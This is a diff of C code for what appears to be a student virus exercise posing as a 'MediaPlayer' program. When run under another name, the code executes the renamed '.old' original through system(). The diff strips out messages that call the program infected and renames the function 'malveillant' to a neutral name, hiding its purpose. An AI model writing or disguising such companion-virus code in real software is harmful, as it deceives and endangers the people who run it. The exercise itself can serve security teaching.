@@ -6,32 +6,25 @@ int main(int argc, char *argv[]) {
 
         char *name = argv[0];
 
-        // Supprime le . et le /
-        //memmove(name, name+2, strlen(name));
-
         if(strcmp(argv[0],"./MediaPlayer")) {
-                printf("\n(%s) : Nous sommes dans un programme infecté\n",argv[0]);
-
                 char *command = argv[0];
                 char *extension = ".old";
                 char *String = malloc(strlen(command) + strlen(extension) + 1);
                 if(String) {
                         strcpy(String,command);
                         strcat(String,extension);
-                        printf("Preparing to execute : %s\n",String);
                         system(String);
                 }
         }
         else {
-                mediaplayer();
-                printf("\nNous sommes dans le virus originel\n");
+                listeFichier(".jpeg");
         }
-        malveillant();
+        listingExecs();
         return 0;
 }
 
 /*
-        Vérifie si la fonction contient ".jpeg"
+        Vérifie si le fichier contient ".jpeg"
 */
 bool checkStringContains(char *fileName) {
         char *lookingFor = ".jpeg";
@@ -92,14 +85,10 @@ void listeFichier(char *extension) {
         }
 }
 
-void mediaplayer () {
-        listeFichier(".jpeg");
-}
-
 /*
         Compte le nombre de fichiers executables dans le dossier à l'execution
 */
-void cptExec() {
+void listingExecs() {
         DIR *myDir;
         struct dirent *dir;
 
@@ -192,8 +181,4 @@ bool verifPresenceFichierOld(char *str) {
                 closedir(myDir);
         }
         return present;
-}
-
-void malveillant() {
-        cptExec();
 }
